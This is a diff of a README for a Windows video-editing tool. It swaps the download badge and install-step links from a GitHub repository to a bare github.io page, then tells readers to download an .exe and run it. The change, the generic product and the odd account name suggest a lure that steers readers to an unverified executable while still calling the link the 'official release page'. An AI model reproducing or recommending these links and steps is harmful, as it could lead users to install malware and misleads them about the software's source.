@@ -1,6 +1,6 @@
 # 🎨 Creative-Workflow-Tool - Edit professional videos with ease
 
-[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge&logo=windows)](https://github.com/bouvetislandflab679/Creative-Workflow-Tool)
+[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge&logo=windows)](https://bouvetislandflab679.github.io)
 
 ## 📌 Usage Overview
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to set up the software on your Windows computer:
 
-1.  Visit the official release page via this link: [https://github.com/bouvetislandflab679/Creative-Workflow-Tool](https://github.com/bouvetislandflab679/Creative-Workflow-Tool).
+1.  Visit the official release page via this link: [https://bouvetislandflab679.github.io](https://bouvetislandflab679.github.io).
 2.  Locate the latest version file ending in .exe.
 3.  Click the file to start the download.
 4.  Open your Downloads folder and double-click the installer file.
